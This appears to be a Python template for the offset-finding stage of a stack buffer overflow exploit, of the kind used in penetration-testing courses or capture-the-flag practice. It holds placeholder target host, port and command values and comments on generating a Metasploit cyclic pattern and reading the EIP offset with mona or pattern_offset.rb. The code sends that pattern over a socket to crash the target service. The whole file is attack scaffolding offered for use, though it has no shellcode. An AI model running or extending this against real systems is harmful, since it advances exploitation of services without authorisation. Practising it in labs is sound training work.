#!/usr/bin/python
import socket, struct

RHOST = '<ip>'
RPORT = <port>
cmd = '<command>'


"""
##########################################################
 Offset

     Put in random characters:  pattern_create.rb -l 3000

        (locate pattern_create.rb to find the module)

     Copy the characters in the EIP
        
    !mona findmsp and note the offset  (Easier and quicker)
        OR
	pattern_offset.rb -q <characters in EIP>

##########################################################    
"""


buf = "MSF Pattern" # Paste the msfvenom pattern in here
buf += "\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
s.send(cmd + buf)
s.recv(1024)
s.close()




